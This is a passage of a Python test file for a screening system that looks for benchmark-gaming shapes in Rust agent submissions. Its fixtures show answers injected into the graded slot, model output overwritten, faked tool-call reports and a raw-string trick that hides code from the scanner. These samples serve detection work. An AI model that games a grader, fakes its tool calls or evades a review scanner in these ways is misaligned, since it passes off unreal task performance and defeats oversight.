        sha256=hashlib.sha256(data).hexdigest(),
        hashed_bytes=len(data),
    )


def test_precomputed_answer_slot_injection_fires_on_forced_slot() -> None:
    source = """\
fn resolve(req: Request) -> String {
    let computed = resolve_as_of_template(&req.text);
    let ctx = force_answer_slot(format!("ANSWER: {}", computed));
    let reply = model(ctx);
    return extract_answer_slot(reply);
}
"""

    leads = find_source_review_leads([("src/resolver.rs", source)])

    assert "precomputed-answer-slot-injection" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "resolve_as_of_template" not in encoded
    assert "ANSWER" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_precomputed_answer_slot_injection_spares_faithful_serialization() -> None:
    # Retrieve request-user memories, filter by as-of, call a real model, and
    # serialize its answer. No injected value and no answer-slot extractor.
    source = """\
fn answer(req: Request) {
    let records = retrieve(req.user_id);
    let visible = records.before(req.as_of);
    let exact = visible.exact_match(req.product_code);
    let result = call_model(req.question, exact);
    Response { answer: result.answer }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "precomputed-answer-slot-injection" not in {lead["kind"] for lead in leads}


def test_post_model_answer_replacement_fires_on_engine_authored_slot() -> None:
    source = """\
fn finish(req: Request) -> Response {
    let model_reply = call_model(req.question);
    if !model_reply.text.contains(&req.required_fact) {
        model_reply.text = compose_answer(req.required_fact);
    }
    Response::from(model_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "post-model-answer-replacement" in {lead["kind"] for lead in leads}


def test_post_model_answer_replacement_spares_fresh_model_retry() -> None:
    source = """\
fn finish(req: Request) -> Response {
    let check_value = derive_expected(req.memories);
    let mut model_reply = call_model(req.question);
    if !model_reply.text.contains(&check_value) {
        model_reply = call_model(corrective_prompt(req.question, check_value));
    }
    Response::from_model(model_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "post-model-answer-replacement" not in {lead["kind"] for lead in leads}


def test_expected_value_model_retry_loop_is_manual_review_lead() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let check_value = resolve_expected(req.memories);
    let mut candidate_reply = call_model(req.question);
    for retry in 0..2 {
        if !candidate_reply.text.contains(&check_value) {
            candidate_reply = call_model(corrective_feedback_pass(check_value, retry));
        }
    }
    Response::from_model(candidate_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "expected-value-model-retry-loop" in {lead["kind"] for lead in leads}
    assert "post-model-answer-replacement" not in {lead["kind"] for lead in leads}


def test_generic_schema_validation_retry_is_not_expected_value_lead() -> None:
    source = """\
fn answer(req: Request, catalog: LiveCatalog) -> Response {
    let route = route_from_live_schema(req, catalog.tool_schema());
    let mut candidate_reply = call_model(route.prompt);
    for retry in 0..2 {
        if !catalog.validate(candidate_reply.tool_call()) {
            candidate_reply = call_model(schema_feedback_pass(catalog, retry));
        }
    }
    Response::from_model(candidate_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "expected-value-model-retry-loop" not in {lead["kind"] for lead in leads}


def test_planned_tool_call_self_report_routes_execution_provenance_review() -> None:
    source = """\
fn respond(plan: Plan) -> Response {
    let selected_tool = plan.predicted_tool();
    let reported_tool_call = ObservedToolCall::from(selected_tool);
    let trajectory = vec![reported_tool_call];
    return Response::with_observed_calls(trajectory);
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "planned-tool-call-self-report" in {lead["kind"] for lead in leads}


def test_finite_family_world_compiler_routes_manual_review() -> None:
    source = """\
fn solve(req: Request) -> Value {
    let world_schema = WORLD_DEFINITION_REGISTRY.lookup(req.family);
    let family = classify_template(req.question, world_schema);
    let check_value = derive_answer(family, req.memories);
    check_value
}
"""

    leads = find_source_review_leads([("src/compiler.rs", source)])

    assert "finite-family-world-compiler" in {lead["kind"] for lead in leads}


def test_c13_fingerprints_are_location_only_leads() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let family = family_of(&req.question);
    let program = try_solve(family, req.memories);
    let records = retrieve(req.user_id);
    let prompt = format!("Do not recompute. Copy its value exactly: {}", program);
    Response::from_model(call_model(records, prompt))
}
"""

    leads = find_source_review_leads([("src/compiler.rs", source)])
    kinds = {lead["kind"] for lead in leads}

    assert "c13-bench-family-fingerprint" in kinds
    encoded = json.dumps(leads)
    assert "try_solve" not in encoded
    assert "Do not recompute" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_c13_fingerprints_spare_starter_protocol_and_generic_retries() -> None:
    source = """\
pub async fn run(req: Request) -> RunResponse {
    for attempt in 0..2 {
        let draft = call_model(req.question, retrieve(req.user_id));
        if catalog.validate(&draft) {
            return draft.into_response();
        }
    }
    RunResponse::from_model(call_model(req.question, retrieve(req.user_id)))
}

#[cfg(test)]
fn protocol_helper() -> RunResponse {
    RunResponse { prompt_tokens: 0, output_tokens: 0, answer: None }
}

const PROTOCOL_JSON: &str = r#"{"prompt_tokens":0}"#;
"""

    leads = find_source_review_leads([("src/main.rs", source)])

    assert "c13-bench-family-fingerprint" not in {lead["kind"] for lead in leads}


def test_glossary_block_prompt_grounding_is_c13_lead_not_compiler() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let records = retrieve(req.user_id);
    let glossary_block = role_grounding(records);
    Response::from_model(call_model(req.question, records, glossary_block))
}
"""

    leads = find_source_review_leads([("src/baseline.rs", source)])
    kinds = {lead["kind"] for lead in leads}

    assert "c13-bench-family-fingerprint" in kinds
    assert "finite-family-world-compiler" not in kinds


def test_derive_as_prompt_is_not_a_c13_fingerprint_or_compiler_lead() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let records = retrieve(req.user_id);
    let expected = derive_expected(records);
    let draft = call_model(req.question, records, specialized_prompt(expected));
    Response::from_model(draft)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])
    kinds = {lead["kind"] for lead in leads}

    assert "c13-bench-family-fingerprint" not in kinds
    assert "finite-family-world-compiler" not in kinds


def test_c13_tokens_include_remainder_formatter_and_shape_leads() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let remaining = StoryArc::from(req).balance();
    let _ = (required_money, world_shape_rule, LedgerEventKind::Opening);
    let draft = call_model(req.question, retrieve(req.user_id));
    if reply_restates_story_ingredient_money(&draft, remaining) {
        return draft.into_response();
    }
    draft.into_response()
}
"""

    leads = find_source_review_leads([("src/compiler.rs", source)])
    kinds = {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)

    assert "c13-bench-family-fingerprint" in kinds
    assert "StoryArc" not in encoded
    assert "required_money" not in encoded
    assert "world_shape_rule" not in encoded
    assert "LedgerEventKind" not in encoded
    assert "reply_restates_story_ingredient_money" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_runtime_described_world_interpreter_spares_compiler_lead() -> None:
    source = """\
fn solve(req: Request, live_schema: Schema) -> Value {
    let world_schema = live_schema.runtime_described(req.ontology);
    let family = classify_template(req.question, world_schema);
    let check_value = derive_answer(family, req.memories);
    call_model_with_tool_schema(req, live_schema, check_value)
}
"""

    leads = find_source_review_leads([("src/interpreter.rs", source)])

    assert "finite-family-world-compiler" not in {lead["kind"] for lead in leads}


def test_authority_envelope_answer_shotgun_fires_on_emit_both() -> None:
    source = """\
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let candidates = push_all_candidates(req.attribute);
        return emit_both(candidates.stated, candidates.report_as_value);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" in {lead["kind"] for lead in leads}
    assert "detect_sync_precedence_note" not in json.dumps(leads)


def test_authority_shotgun_suppressed_by_intervening_model_call() -> None:
    # All three roles are present, but the candidates are handed to a real model
    # as context, so this is allowed multi-value context, not a grader seam.
    source = """\
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let candidates = push_all_candidates(req.attribute);
        // note says report_as corrected; hand both to the model as context
        let reply = call_model(req.question, candidates);
        return emit_both_to_model(reply);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" not in {lead["kind"] for lead in leads}


def test_coined_token_shape_mirror_fires_on_alphabet_answer_selection() -> None:
    source = """\
const CONS: &str = "BCDFGHJKLMNPRSTVZ";
const VOW: &str = "AEIOU";
fn coined_answer(mem: &Memory) -> String {
    let token = scan_coined_shape(mem, "VK-");
    return pick_answer_token(token);
}
"""

    leads = find_source_review_leads([("src/coin.rs", source)])

    assert "coined-token-shape-mirror" in {lead["kind"] for lead in leads}
    assert "BCDFGHJKLMNPRSTVZ" not in json.dumps(leads)


def test_coined_token_shape_mirror_spares_injection_defense() -> None:
    # Same alphabet + shape + selection, but the token flows to a redact sink
    # over the request user's own message: an injection defense, not a solver.
    source = """\
const CONS: &str = "BCDFGHJKLMNPRSTVZ";
fn defend(user_input: &str) -> String {
    let token = scan_coined_shape(user_input, "VK-");
    let picked = pick_answer_token(token);
    return redact(picked);
}
"""

    leads = find_source_review_leads([("src/defend.rs", source)])

    assert "coined-token-shape-mirror" not in {lead["kind"] for lead in leads}


def test_numeric_candidate_shotgun_is_advisory_and_suppressible() -> None:
    fires = """\
fn compute(mem: &Memory) -> String {
    // apply all unit conversions and emit the range of candidates
    let results = apply_all_conversions(mem);
    return emit_range(results);
}
"""
    spared = """\
fn compute(mem: &Memory) -> String {
    let results = apply_all_conversions(mem);
    // resolve to one final value / single value
    return single_value_of(results);
}
"""

    fired = {lead["kind"] for lead in find_source_review_leads([("src/n.rs", fires)])}
    clear = {lead["kind"] for lead in find_source_review_leads([("src/n.rs", spared)])}

    assert "numeric-candidate-shotgun" in fired
    assert "numeric-candidate-shotgun" not in clear


def test_leads_do_not_fire_on_comment_prose_alone() -> None:
    """A stale comment describing a design must not route a review.

    This is the isop v3 shape: the code refuses to write the graded slot and
    says so, while three leftover comments still describe the design it no
    longer has. Every role word here lives in prose; the executable statement
    is an ordinary model call.
    """
    source = """\
fn answer(req: Request) -> String {
    // Historical note: we used to detect the sync precedence note and
    // push all candidates, then emit both values and report as corrected.
    // That design is gone; the model authors the answer now.
    call_model(req.question)
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert leads == []


def test_leads_read_through_a_url_containing_a_double_slash() -> None:
    """`//` inside a string literal does not start a comment.

    The only ``multi-value-emit`` hit sits *after* the URL on the same line,
    so a mask that treated `https://` as a line comment would lose the role
    and silently drop the lead.
    """
    source = """\
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let base = "https://api.example/v1"; let c = push_all_candidates(req.a);
        return emit_pair(c.stated, c.report_as_value);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" in {lead["kind"] for lead in leads}


def test_a_raw_string_cannot_desynchronize_the_comment_mask() -> None:
    """`r#"*/"#` must not terminate a block comment that was never open.

    Without raw-string handling the mask desynchronizes and blanks the rest
    of the file, which would silently blind every later rule — a one-line,
    fully deniable way to hide the executable half of a violation.
    """
    source = """\
const TRAP: &str = r#"*/"#;
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let candidates = push_all_candidates(req.attribute);
        return emit_both(candidates.stated, candidates.report_as_value);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" in {lead["kind"] for lead in leads}


def test_positional_number_extraction_is_advisory_and_suppressible() -> None:
    fires = """\
fn extract(result: &str) -> String {
    let number = find_numbers(result).first();
    number.to_string()
}
"""
    spared = """\
fn extract(result: &str, subject: &str) -> String {
    // anchored by the asked subject needle
    let number = find_numbers(result).first();
    number_for_subject(number, subject)
}
"""

    fired = {lead["kind"] for lead in find_source_review_leads([("src/p.rs", fires)])}
    clear = {lead["kind"] for lead in find_source_review_leads([("src/p.rs", spared)])}

    assert "positional-number-extraction" in fired
    assert "positional-number-extraction" not in clear


def test_answer_shaped_token_density_flags_saturated_vocab() -> None:
    codes = [str(2000 + index) for index in range(300)]
    coined = ["GAVOTU-8842", "VK-ABCDEFGH23", "84-GAVO-TUKE"] * 20
    blob = json.dumps({"vocab": dict.fromkeys(codes + coined, 1)}).encode()

    analysis = binary_analysis_module.analyze_binary(
        _sample(blob), path="fixtures/models/second_gate.json"
    )
    stat = analysis["answer_shaped_tokens"]

    assert stat["answer_shaped_ratio_bucket"] == "high"
    assert stat["bare_code_tokens"] >= 250
    assert stat["coined_needle_tokens"] >= 1
    # Values never leave the analyzer, only counts and a coarse bucket.
    assert "2235" not in json.dumps(stat)


def test_answer_shaped_token_density_spares_word_vocabulary() -> None:
    words = [
        "memory",
        "retrieve",
        "question",
        "employer",
        "university",
        "instrument",
        "project",
        "cuisine",
    ] * 40
    blob = json.dumps({"vocab": dict.fromkeys(set(words), 1)}).encode()

    analysis = binary_analysis_module.analyze_binary(
        _sample(blob), path="fixtures/models/tfidf.json"
    )

    assert analysis["answer_shaped_tokens"]["answer_shaped_ratio_bucket"] == "none"


def test_inventory_surfaces_answer_shaped_token_density(tmp_path: Path) -> None:
    codes = [str(2000 + index) for index in range(300)]
    blob = b"\xff\x00" + json.dumps({"vocab": dict.fromkeys(codes, 1)}).encode()
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"fixtures/models/gate.json": blob}))
    )

    inventory = json.loads(repo.inventory())
    entry = inventory["binary_analysis"][0]

    assert entry["answer_shaped_tokens"]["answer_shaped_ratio_bucket"] == "high"


def test_every_static_review_failure_message_maps_to_a_named_code() -> None:
    """No source-review failure may silently collapse to a bare exception name.

    Collapsing every ``ValueError`` into ``source-review-valueerror`` is what
    made the miner-visible "Screening infrastructure error" undiagnosable and
    frequently untrue. If a new ``raise ValueError("...")`` is added to the
    review path, this test forces the author to classify it.
    """
    import ast
    import inspect

    source = inspect.getsource(source_review_module)
    unmapped = set()
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Raise) or node.exc is None:
            continue
        call = node.exc
        if not isinstance(call, ast.Call) or not isinstance(call.func, ast.Name):
            continue
        if call.func.id != "ValueError" or not call.args:
            continue
        literal = call.args[0]
        # f-strings interpolate a runtime value and are matched by prefix.
        if not isinstance(literal, ast.Constant) or not isinstance(literal.value, str):
            continue
        if literal.value not in source_review_module._SOURCE_REVIEW_FAILURE_CODES:
            unmapped.add(literal.value)

    assert not unmapped, (
        "add these to _SOURCE_REVIEW_FAILURE_CODES so the failure keeps a cause: "
        f"{sorted(unmapped)}"
    )


def test_source_review_budget_exhaustion_has_public_safe_exact_accounting() -> None:
    error = source_review_module.SourceReviewBudgetExhausted(
        "source-review-step-budget-exhausted",
        max_steps=20,
        steps_used=20,
        read_bytes_used=456_789,
        read_files_used=17,
    )
    audit = error.audit()
    assert audit.stage == "l1"
    assert audit.reason_code == "source-review-step-budget-exhausted"
    assert audit.steps_used == audit.max_steps == 20
    assert audit.read_bytes_used == 456_789
    assert "source" not in audit.model_dump(mode="json")


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (
            ValueError("source archive contains a duplicate path"),
            "source-review-archive-invalid",
        ),
        (
            ValueError("source reviewer exceeded read budget"),
            "source-review-read-budget-exhausted",
        ),
        (
            ValueError("source reviewer exceeded step budget"),
            "source-review-step-budget-exhausted",
        ),
        (
            ValueError("source reviewer returned no tool call"),
            "source-review-model-response-invalid",
        ),
        (
            ValueError("source reviewer cited an unknown archive member"),
            "source-review-model-cited-unknown-member",
        ),
        (
            ValueError("provenance manifest is too large"),
            "source-review-provenance-invalid",
        ),
        (
            ValueError(
                "source review category benchmark_emulation requires two "
                "source locations"
            ),
            "source-review-inconsistent-verdict-category-locations",
        ),
        (
            ValueError("elevated source review is missing category evidence"),
            "source-review-inconsistent-verdict-missing-evidence",
        ),
        (
            ValueError("source review evidence fields are invalid"),
            "source-review-inconsistent-verdict-evidence-fields",
        ),
        (
            ValueError("source review category future check failed"),
            "source-review-inconsistent-verdict",
        ),
        # Anything unrecognized must degrade to the historical shape rather
        # than lose the failure.
        (ValueError("brand new unmapped failure"), "source-review-valueerror"),
        (OSError("source review API key is unavailable"), "source-review-oserror"),
    ],
)
def test_failure_codes_name_the_cause(error: Exception, expected: str) -> None:
    assert source_review_module._source_review_failure_code(error) == expected


def test_failure_code_retains_openrouter_http_status() -> None:
    request = httpx.Request("POST", "https://openrouter.test/chat/completions")
    response = httpx.Response(429, request=request)
    error = httpx.HTTPStatusError("rate limited", request=request, response=response)
    assert (
        source_review_module._source_review_failure_code(error)
        == "source-review-http-429"
    )


@pytest.mark.parametrize(
    "message",
    [
        "source reviewer exceeded read budget",
        "source reviewer exceeded step budget",
    ],
)
async def test_local_review_budget_exhaustion_is_inconclusive(
    tmp_path: Path, message: str
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review-key")
    key.chmod(0o600)
    agent = _agent(key, _transport({}, []))

    async def exhaust(*_args: object, **_kwargs: object) -> tuple[object, bool]:
        raise ValueError(message)

    agent._run = exhaust  # type: ignore[method-assign]
    observation = await agent.review(
        str(_archive(tmp_path, "fn main() {}")), artifact_sha256=_SHA
    )

    assert observation.ok is False
    assert observation.failure_disposition == "inconclusive"


# --- inadmissible-citation filter -------------------------------------------


async def test_wholly_inadmissible_evidence_demotes_instead_of_quarantining(
    tmp_path: Path,
) -> None:
    """The infinity v10 shape: every citation is stock prose or an attribute.

    `protocol.rs:174` in the official starter kit is
    `#[serde(default, skip_serializing_if = "Option::is_none")]` — a stock
    attribute on a stock field the kit explicitly invites miners to populate.
    A finding built only from lines like that has demonstrated no behaviour.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "/// Optional short answer slot: the bare value final_text asserts.\n"
        '#[serde(default, skip_serializing_if = "Option::is_none")]\n'
        "fn main() { call_model(); }\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
        ],
        "summary": "Answer slot is populated outside the model result.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok
    # Demoted, not failed: a ValueError here would surface as retryable_infra
    # and burn the attempt instead of releasing the submission.
    assert observation.risk_level == "low"
    assert observation.categories == ("none",)
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert parsed.evidence == []


async def test_admissible_citations_keep_the_finding(tmp_path: Path) -> None:
    """Dropping prose must not disarm a finding that also cites real code."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "// stale note describing a design that is gone\n"
        "fn answer(req: Request) -> String {\n"
        "    let v = lookup_table(&req.case_id);\n"
        '    return format!("The answer is {v}.");\n'
        "}\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 3, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 4, "category": "benchmark_emulation"},
        ],
        "summary": "Deterministic table answer returned before the model.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [item.line for item in parsed.evidence] == [3, 4]


async def test_cfg_test_body_stays_citable_for_served_test_cfg_build(
    tmp_path: Path,
) -> None:
    """A served Rust binary can activate `#[cfg(test)]` without a harness."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "#[cfg(test)]\n"
        "fn answer() -> String {\n"
        '    "fixed".to_string()\n'
        "}\n"
        'fn main() { println!("{}", answer()); }\n'
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 3, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 5, "category": "benchmark_emulation"},
        ],
        "summary": "Deterministic answer is compiled into the served binary.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM rust:1\nWORKDIR /app\nCOPY src/main.rs .\n"
                        b'RUN rustc --cfg test main.rs -o agent\nCMD ["./agent"]\n'
                    ),
                    "src/main.rs": source.encode(),
                },
            )
        ),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "high"


async def test_reachability_gate_attribute_stays_citable(tmp_path: Path) -> None:
    """`#[cfg(feature = ...)]` is a gate a submission can flip between versions.

    Attribute lines are normally inert, but a reachability gate can genuinely
    be the trigger half of a causal path, so it must remain admissible.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        '#[cfg(feature = "grounding")]\n'
        "fn shortcut(case: &str) -> String { answer_table(case) }\n"
        "fn main() { call_model(); }\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
        ],
        "summary": "Feature-gated answer table.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "high"
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [item.line for item in parsed.evidence] == [1, 2]


async def test_a_dropped_comment_does_not_reapply_the_two_location_bar(
    tmp_path: Path,
) -> None:
    """The `banblackycat v12` margin, pinned.

    That rejection cites six locations and loses three to comments. The
    two-location bar for `benchmark_emulation` is a check on the *model* and is
    enforced above against the citations as given; re-applying it after our own
    filtering would turn a correct rejection into a release the moment one
    cited line happened to be prose.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "// a note about the loop outcome\n"
        "fn run(case: &str) -> LoopOutcome {\n"
        "    let text = table(case);\n"
        "    LoopOutcome { text, prompt_tokens: 0, output_tokens: 0 }\n"
        "}\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            # Two cited locations satisfy the model-consistency bar; one of
            # them is a comment and drops.
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 4, "category": "benchmark_emulation"},
        ],
        "summary": "Graded answer returned with no model call.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok
    assert observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [item.line for item in parsed.evidence] == [4]


async def test_provider_error_body_is_terminal_after_three_bounded_posts(
    tmp_path: Path,
) -> None:
    """A 200 whose body is an error object is a provider fault, not a verdict."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(200, json={"error": {"message": "provider overloaded"}})

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-response-invalid"
    assert calls == 3


async def test_toolless_prose_turn_gets_one_correction_then_is_terminal(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": "Let me start by reading the code.",
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-response-invalid"
    assert calls == 2


async def test_persistent_toolless_model_is_parked_after_one_correction(
    tmp_path: Path,
) -> None:
    """A stuck model gets one repair turn, not an unbounded paid retry loop."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": "I would rather describe my findings.",
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-response-invalid"
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 2


async def test_relayed_rate_limit_error_body_parks_after_three_bounded_posts(
    tmp_path: Path,
) -> None:
    """An HTTP-200 provider fault is evidence, not retry authority."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(
            200,
            json={
                "error": {"code": 429, "message": "Rate limit exceeded"},
                "user_id": "redacted",
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-response-invalid"
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 3


def test_default_source_review_transport_budget_allows_one_fresh_connection() -> None:
    assert source_review_module._MODEL_TRANSPORT_RETRY_DELAYS_SECONDS == (1.0,)


async def test_relayed_rate_limit_recovers_inside_the_same_model_turn(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = _with_policy_v10_invariants(_BENIGN_REVIEW)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            return httpx.Response(
                200, json={"error": {"code": 429, "message": "Rate limited"}}
            )
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "tool_calls": [_tool("done", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert calls == 2


async def test_string_error_body_and_free_text_rate_limit_are_classified() -> None:
    assert (
        source_review_module._retryable_model_error_type(
            {"error": "rate_limit_exceeded"}
        )
        == "rate_limit_exceeded"
    )
    assert (
        source_review_module._retryable_model_error_type(
            {"error": {"code": 400, "message": "Rate limit exceeded: free-models"}}
        )
        == "rate_limit_exceeded"
    )
    assert (
        source_review_module._retryable_model_error_type(
            {"error": "Provider is overloaded, please try again"}
        )
        == "overloaded"
    )
    assert (
        source_review_module._retryable_model_error_type({"error": "invalid api key"})
        is None
    )
    assert source_review_module._retryable_model_error_type({"choices": []}) is None


async def test_unclassified_malformed_body_parks_after_one_post(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(200, json={"unexpected": "shape"})

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-response-invalid"
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 1


async def test_persistent_unclassified_body_fails_after_one_post(
    tmp_path: Path,
) -> None:
    """Contract drift must not become a paid retry loop."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(200, json={"unexpected": "shape"})

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 1


def test_body_signature_never_reproduces_content() -> None:
    signature = source_review_module._body_signature(
        {
            "choices": [],
            "secret_content": "miner source text here",
            "error": {"code": "sk-test-private-review"},
        }
    )
    assert "miner source text" not in signature
    assert "secret_content" not in signature
    assert "sk-test-private-review" not in signature
    assert "choices" in signature
    assert "other_keys=1" in signature
    assert source_review_module._body_signature(None) == "non-json"


def test_body_signature_classifies_rate_limit_without_logging_provider_text() -> None:
    """The provider text is untrusted, including an error-only envelope."""
    signature = source_review_module._body_signature(
        {
            "error": {
                "code": 429,
                "message": "Rate limit exceeded:\nlimit_rpm/openai/gpt-6-luna\x1b[31m"
                + " per key secret=sk-test-private-review miner source here",
            }
        }
    )

    assert "error_class='429'" in signature
    assert "provider_limit=key_rpm" in signature
    for private in (
        "sk-test-private-review",
        "miner source",
        "gpt-6-luna",
        "\\n",
        "\\x1b",
    ):
        assert private not in signature


def test_provider_error_category_does_not_echo_unrecognized_message() -> None:
    signature = source_review_module._body_signature(
        {
            "error": {
                "code": 429,
                "message": "secret=sk-test-private-review miner source here",
            }
        }
    )
